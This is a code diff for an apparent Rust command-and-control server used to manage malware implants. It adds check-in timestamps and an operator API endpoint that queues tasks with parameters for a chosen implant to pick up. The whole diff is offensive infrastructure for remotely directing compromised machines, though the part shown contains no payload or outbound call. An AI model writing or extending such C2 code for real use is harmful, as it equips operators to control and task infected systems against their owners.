@@ -58,6 +58,7 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
             let mut new_inmate = inmate.clone();
             new_inmate.pending_instruct = "".to_string();
             new_inmate.pending_instruct_type = c2_actions::Wait;
+            new_inmate.last_checkin = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs();
             let response = CheckInResponse {
                 task: inmate.pending_instruct_type,
                 task_parameters: inmate.pending_instruct,
@@ -93,6 +94,9 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
         }
     }
 }
+
+
+// Operator api
 
 #[get("/operator")]
 fn operator_panel() -> Json<String> {
@@ -149,6 +153,25 @@ fn operator_panel_post(request: Json<String>) -> &'static str {
     let apiRequest = request.into_inner();
     "Ok"
 }
+
+#[post("/operator/<implant_id>/add_task", data = "<request>")]
+fn operator_panel_add_task(request: Json<CheckInResponse>, implant_id: u32) -> &'static str {
+    let apiRequest = request.into_inner();
+    match implant_exists(implant_id) {
+        Ok(inmate) => {
+            let mut new_inmate = inmate.clone();
+            new_inmate.pending_instruct = apiRequest.task_parameters;
+            new_inmate.pending_instruct_type = apiRequest.task;
+            update_database(new_inmate);
+            "Created task successfully"
+        }
+        Err(_) => {
+            println!("Unknown implant, failed to create task, id: {}", implant_id);
+            "Failed to create task, unknown implant"
+        }
+    }
+}
+
  
 #[launch]
 fn rocket() -> _ {
@@ -161,4 +184,5 @@ fn rocket() -> _ {
         .mount("/", routes![operator_panel_specific])
         .mount("/", routes![operator_panel_post])
         .mount("/", routes![operator_panel_specific_recent])
+        .mount("/", routes![operator_panel_add_task])
 }
